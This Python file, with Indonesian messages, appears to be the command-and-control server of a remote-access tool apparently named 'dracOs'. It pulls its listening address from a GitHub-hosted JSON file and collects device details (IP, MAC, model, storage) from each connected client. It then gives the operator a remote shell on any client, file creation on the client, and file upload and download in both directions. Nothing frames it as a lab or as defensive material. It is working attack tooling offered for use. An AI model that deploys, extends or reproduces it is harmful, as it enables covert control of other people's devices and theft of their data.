import socket
import threading
import json
import os
import base64
import subprocess
import sys
import importlib.util
import shlex

# === AUTO INSTALL MODULE ===
def ensure(package, module=None):
    try:
        if module is None:
            module = package
        if importlib.util.find_spec(module) is None:
            print(f"[INFO] Menginstall modul: {package}")
            subprocess.check_call([sys.executable, "-m", "pip", "install", package])
    except Exception as e:
        print(f"[ERROR] Gagal install {package}: {e}")

for mod in ["requests", "colorama", "pyreadline3"]:
    ensure(mod)

import requests
from colorama import Fore, Style, init

# === READLINE SUPPORT ===
try:
    import readline   # Linux/Termux/macOS
except ImportError:
    try:
        import pyreadline3 as readline  # Windows
    except ImportError:
        print("[PERINGATAN] readline tidak tersedia.")

init(autoreset=True)

# === GLOBALS ===
clients = {}  # key: "hostname[ip]" -> { conn, addr, info }
lock = threading.Lock()
CONFIG_URL = "https://raw.githubusercontent.com/ExsoKamabay/Api-scrap/refs/heads/master/kmy_scrap/files.json"

# === KONFIG SERVER (baca bagian 'server' dari JSON) ===
def get_server_bind():
    """
    Server WAJIB ambil host/port dari bagian 'server' di files.json
    Contoh:
    {
      "server": {"host": "0.0.0.0", "port": 8080},
      "client": {"host": "0.0.0.0", "port": 8080}
    }
    """
    try:
        res = requests.get(CONFIG_URL, timeout=6)
        cfg = res.json()
        host = cfg["server"]["host"]
        port = int(cfg["server"]["port"])
        return host, port
    except Exception as e:
        print(Fore.RED + f"[ERROR] Tidak bisa ambil config server: {e}")
        # fallback aman
        return "0.0.0.0", 8080

def safe_str(v): return "----" if (v is None or v == "") else str(v)

def format_hostname(info: dict) -> str:
    ip = info.get("ip", "----")
    host = info.get("hostname", "Unknown")
    return f"{host}[{ip}]"

# === HANDLE CLIENT ===
def handle_client(conn, addr):
    try:
        while True:
            data = conn.recv(8192)
            if not data:
                break
            msg = json.loads(data.decode())
            mtype = msg.get("type", "")

            if mtype == "dracOs":
                info = msg.get("info", {})
                key = format_hostname(info)
                with lock:
                    clients[key] = {"conn": conn, "addr": addr, "info": info}
                print(Fore.MAGENTA + f"[JOIN] {key} ({safe_str(info.get('system'))} {safe_str(info.get('release'))}) dari {addr[0]}")

            elif mtype == "status":
                print(Fore.YELLOW + f"[{safe_str(msg.get('hostname'))}] {safe_str(msg.get('message'))}")

            elif mtype == "file":
                # client -> server (IMPORT)
                fname = msg.get("filename", "file.bin")
                dest = msg.get("dest", ".")
                payload = msg.get("data", "")
                try:
                    raw = base64.b64decode(payload.encode())
                    os.makedirs(dest, exist_ok=True)
                    out_path = os.path.join(dest, fname)
                    with open(out_path, "wb") as f:
                        f.write(raw)
                    print(Fore.CYAN + f"[FILE] Menerima {fname} -> {out_path}")
                except Exception as e:
                    print(Fore.RED + f"[ERROR] Simpan file: {e}")

    except Exception as e:
        print(Fore.RED + f"[ERROR] Client handler: {e}")
    finally:
        conn.close()

# === COMMANDS ===
def cmd_list():
    with lock:
        if not clients:
            print(Fore.RED + "Tidak ada client yang terhubung.")
            return
        for i, (k, c) in enumerate(clients.items(), start=1):
            info = c["info"]
            print("╔" + "═"*54 + "╗")
            print(f"║ [{i}] {k:<48} ║")
            print("╠" + "═"*54 + "╣")
            print(f"║ IP        : {safe_str(info.get('ip')):<38} ║")
            print(f"║ MAC       : {safe_str(info.get('mac')):<38} ║")
            print(f"║ Sistem    : {safe_str(info.get('system'))} {safe_str(info.get('release')):<27} ║")
            print(f"║ Model     : {safe_str(info.get('brand'))} {safe_str(info.get('model')):<27} ║")
            print(f"║ RAM       : {safe_str(info.get('ram_total_gb'))} GB{'':<32}║")
            print(f"║ Storage   : {safe_str(info.get('storage_used_gb'))}/{safe_str(info.get('storage_total_gb'))} GB (sisa {safe_str(info.get('storage_free_gb'))} GB) ║")
            print(f"║ Direktori : {safe_str(info.get('cwd')):<38} ║")
            print("╚" + "═"*54 + "╝\n")

def cmd_connect(key):
    with lock:
        item = clients.get(key)
    if not item:
        print(Fore.RED + f"[ERROR] Client {key} tidak ditemukan.")
        return
    conn = item["conn"]
    print(Fore.CYAN + f"[INFO] Terhubung ke {key}. Ketik 'exit' untuk keluar.")
    while True:
        cmd = input(Fore.YELLOW + f"{key}$ " + Style.RESET_ALL)
        if cmd.strip().lower() == "exit":
            break
        payload = {"type": "command", "command": cmd}
        conn.sendall(json.dumps(payload).encode())

def cmd_cfile(key, content, path):
    with lock:
        item = clients.get(key)
    if not item:
        print(Fore.RED + f"[ERROR] Client {key} tidak ditemukan.")
        return
    payload = {"type": "cfile", "content": content, "path": path}
    item["conn"].sendall(json.dumps(payload).encode())
    print(Fore.CYAN + f"[INFO] cfile dikirim ke {key}")

def cmd_import(key, src, dest):
    """Minta client kirim file src -> server simpan ke dest"""
    with lock:
        item = clients.get(key)
    if not item:
        print(Fore.RED + f"[ERROR] Client {key} tidak ditemukan.")
        return
    payload = {"type": "import", "src": src, "dest": dest}
    item["conn"].sendall(json.dumps(payload).encode())
    print(Fore.CYAN + f"[INFO] import diminta dari {key}")

def cmd_export(key, src, dest):
    """Server kirim file src -> client simpan ke dest"""
    with lock:
        item = clients.get(key)
    if not item:
        print(Fore.RED + f"[ERROR] Client {key} tidak ditemukan.")
        return
    try:
        with open(src, "rb") as f:
            raw = f.read()
        b64 = base64.b64encode(raw).decode()
        payload = {"type": "export", "filename": os.path.basename(src), "data": b64, "dest": dest}
        item["conn"].sendall(json.dumps(payload).encode())
        print(Fore.CYAN + f"[INFO] export file dikirim ke {key}")
    except Exception as e:
        print(Fore.RED + f"[ERROR] Export gagal: {e}")

def help_menu():
    print(Fore.CYAN + "\n=== Perintah ===")
    print(Fore.LIGHTGREEN_EX + "list -> untuk melihat daftar clent yang terhubung.")
    print(Fore.LIGHTGREEN_EX + "connect <hostname[IP]>  -> masuk ke shell.")
    print(Fore.LIGHTGREEN_EX + "<hostname[IP]> cfile \"isi\" \"/path/file.txt\"  -> membuat file")
    print(Fore.LIGHTGREEN_EX + "<hostname[IP]> import \"/path/client.txt\" \"./downloads\"  -> import file")
    print(Fore.LIGHTGREEN_EX + "<hostname[IP]> export \"./server.txt\" \"/sdcard/\"  -> export file")
    print(Fore.LIGHTGREEN_EX + "help")
    print(Fore.LIGHTGREEN_EX + "quit() -> disconnect!\n")

# === ACCEPT LOOP ===
def accept_loop(server_sock):
    while True:
        conn, addr = server_sock.accept()
        threading.Thread(target=handle_client, args=(conn, addr), daemon=True).start()

# === SERVER LOOP ===
def main():
    host, port = get_server_bind()
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind((host, port))
    srv.listen(5)
    print(Fore.GREEN + f"[INFO] Server listen di {host}:{port}")
    threading.Thread(target=accept_loop, args=(srv,), daemon=True).start()

    while True:
        try:
            inp = input(Fore.BLUE + "dracOs> " + Style.RESET_ALL).strip()
            if not inp:
                continue

            if inp == "list":
                cmd_list()
                continue
            if inp == "help":
                help_menu()
                continue
            if inp == "quit()":
                print(Fore.RED + "[INFO] Server dimatikan.")
                break
            # Pola: connect <hostname[IP]>
            if inp.lower().startswith("connect "):
                key = inp.split(" ", 1)[1]
                cmd_connect(key)
                continue

            # Pola: <hostname[IP]> <aksi> "arg1" "arg2"
            parts = inp.split(" ", 2)
            if len(parts) >= 2:
                key = parts[0]
                action = parts[1]
                rest = parts[2] if len(parts) > 2 else ""
                if action in ("cfile", "import", "export"):
                    try:
                        args = shlex.split(rest)
                    except Exception as e:
                        print(Fore.RED + f"[ERROR] Argumen tidak valid: {e}")
                        continue
                    if action == "cfile" and len(args) == 2:
                        content, path = args
                        cmd_cfile(key, content, path)
                    elif action == "import" and len(args) == 2:
                        src, dest = args
                        cmd_import(key, src, dest)
                    elif action == "export" and len(args) == 2:
                        src, dest = args
                        cmd_export(key, src, dest)
                    else:
                        print(Fore.RED + "[ERROR] Jumlah argumen salah.")
                else:
                    print(Fore.RED + "[ERROR] Perintah tidak dikenal.")
        except KeyboardInterrupt:
            print()
            break
        except Exception as e:
            print(Fore.RED + f"[ERROR] {e}")

    srv.close()

if __name__ == "__main__":
    main()
